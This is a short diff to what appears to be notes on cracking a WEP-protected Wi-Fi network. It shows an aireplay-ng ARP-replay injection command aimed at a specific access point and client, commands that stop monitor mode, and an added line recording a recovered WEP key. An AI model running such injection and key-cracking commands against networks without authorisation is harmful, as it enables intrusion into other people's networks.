@@ -20,3 +20,5 @@ aireplay-ng -3 -b 00:1E:58:FF:F5:D5 -h C4:85:08:0F:73:1E mon0
 airmon-ng stop mon0
 airmon-ng stop wlan0
 ```
+----------------------------------
+WEP Key in output-0[35].cap `wep16`
